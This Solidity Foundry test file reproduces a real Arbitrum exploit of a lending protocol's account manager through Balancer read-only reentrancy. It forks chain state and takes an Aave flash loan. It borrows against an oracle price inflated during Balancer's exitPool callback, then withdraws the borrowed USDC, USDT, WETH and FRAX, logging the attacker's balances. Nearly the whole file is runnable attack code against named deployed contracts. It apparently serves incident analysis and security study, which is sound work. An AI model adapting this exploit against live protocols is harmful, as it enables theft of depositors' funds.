// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1643417467879059456
// https://twitter.com/spreekaway/status/1643313471180644360
// https://medium.com/coinmonks/theoretical-practical-balancer-and-read-only-reentrancy-part-1-d6a21792066c
// @TX
// https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d
// @Summary
// Attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral

interface IWeightedBalancerLPOracle {
    function getPrice(address token) external view returns (uint256);
}

interface IAccountManager {
    function riskEngine() external;
    function openAccount(address owner) external returns (address);
    function borrow(address account, address token, uint256 amt) external;

    function deposit(address account, address token, uint256 amt) external;

    function exec(address account, address target, uint256 amt, bytes calldata data) external;

    function approve(address account, address token, address spender, uint256 amt) external;
}

interface IBalancerToken is IERC20 {
    function getPoolId() external view returns (bytes32);
}

contract ContractTest is Test {
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    address FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;
    address account;
    bytes32 PoolId;
    uint256 nonce;
    IBalancerToken balancerToken = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);
    IWeightedBalancerLPOracle WeightedBalancerLPOracle =
        IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 77_026_912);
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(FRAX), "FRAX");
        cheats.label(address(account), "account");
        cheats.label(address(Balancer), "Balancer");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(balancerToken), "balancerToken");
        cheats.label(address(AccountManager), "AccountManager");
        cheats.label(address(WeightedBalancerLPOracle), "WeightedBalancerLPOracle");
    }

    function testExploit() external {
        payable(address(0)).transfer(address(this).balance);
        AccountManager.riskEngine();
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 606 * 1e8;
        amounts[1] = 10_050_100 * 1e15;
        amounts[2] = 18_000_000 * 1e6;
        uint256[] memory modes = new uint[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        console.log("\r");
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker WBTC balance after exploit", WBTC.balanceOf(address(this)), WBTC.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        depositCollateral(assets);
        joinPool(assets);
        exitPool();
        WETH.approve(address(aaveV3), type(uint256).max);
        WBTC.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);
        return true;
    }

    function depositCollateral(address[] calldata assets) internal {
        WETH.withdraw(100 * 1e15);
        account = AccountManager.openAccount(address(this));
        WETH.approve(address(AccountManager), 50 * 1e18);
        AccountManager.deposit(account, address(WETH), 50 * 1e18);
        AccountManager.approve(account, address(WETH), address(Balancer), 50 * 1e18);
        PoolId = balancerToken.getPoolId();
        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 0;
        amountIn[1] = 50 * 1e18;
        amountIn[2] = 0;
        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
        // "joinPool(bytes32,address,address,(address[],uint256[],bytes,bool))"
        bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);
        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH
    }

    function joinPool(address[] calldata assets) internal {
        WETH.approve(address(Balancer), 10_000 * 1e18);
        WBTC.approve(address(Balancer), 606 * 1e18);
        USDC.approve(address(Balancer), 18_000_000 * 1e6);
        uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 606 * 1e8;
        amountIn[1] = 10_000 * 1e18;
        amountIn[2] = 18_000_000 * 1e6;
        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_2 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
        Balancer.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), joinPoolRequest_2);
        console.log(
            "Before Read-Only-Reentrancy Collateral Price \t", WeightedBalancerLPOracle.getPrice(address(balancerToken))
        );
    }

    function exitPool() internal {
        balancerToken.approve(address(Balancer), 0);
        address[] memory assetsOut = new address[](3);
        assetsOut[0] = address(WBTC);
        assetsOut[1] = address(0);
        assetsOut[2] = address(USDC);
        uint256[] memory amountOut = new uint256[](3);
        amountOut[0] = 606 * 1e8;
        amountOut[1] = 5000 * 1e18;
        amountOut[2] = 9_000_000 * 1e6;
        uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));
        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);
        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest({
            asset: assetsOut,
            minAmountsOut: amountOut,
            userData: userDatas,
            toInternalBalance: false
        });
        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);
        console.log(
            "After Read-Only-Reentrancy Collateral Price \t", WeightedBalancerLPOracle.getPrice(address(balancerToken))
        );
        address(WETH).call{value: address(this).balance}("");
    }

    fallback() external payable {
        if (nonce == 2) {
            console.log(
                "In Read-Only-Reentrancy Collateral Price \t", WeightedBalancerLPOracle.getPrice(address(balancerToken))
            );
            borrowAll();
        }
        nonce++;
    }

    function borrowAll() internal {
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);
        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);
        bytes memory execData =
            abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1);
        AccountManager.exec(account, FRAXBP, 0, execData);
        AccountManager.approve(account, address(USDC), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(USDT), address(aaveV3), type(uint256).max);
        AccountManager.approve(account, address(WETH), address(aaveV3), type(uint256).max);
        execData =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDC), 580_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDT), 360_000 * 1e6, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData =
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(WETH), 80 * 1e18, account, 0);
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(USDC), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(USDT), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
        execData = abi.encodeWithSignature(
            "withdraw(address,uint256,address)", address(WETH), type(uint256).max, address(this)
        );
        AccountManager.exec(account, address(aaveV3), 0, execData);
    }
}
